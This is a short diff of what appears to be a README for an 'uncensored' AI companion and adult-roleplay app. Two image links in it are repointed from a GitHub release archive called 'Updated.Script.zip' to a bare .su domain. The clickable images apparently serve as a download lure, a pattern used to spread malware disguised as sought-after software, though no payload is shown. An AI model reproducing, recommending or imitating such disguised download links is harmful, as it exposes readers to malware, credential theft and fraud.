@@ -8,10 +8,10 @@
 Dive into a world where your ideal AI girlfriend, boyfriend, or friend comes to life — with full customization, **uncensored roleplay**, **anime-style waifus**, and **adult AI conversations**.
 
 [![avatar](https://github.com/user-attachments/assets/27b2617b-79e1-4869-8ec7-56d26386776f)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 [![image](https://github.com/user-attachments/assets/09e05e09-5beb-4ee1-8eb1-8c9df9d252db)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 ## ✨ Features
 
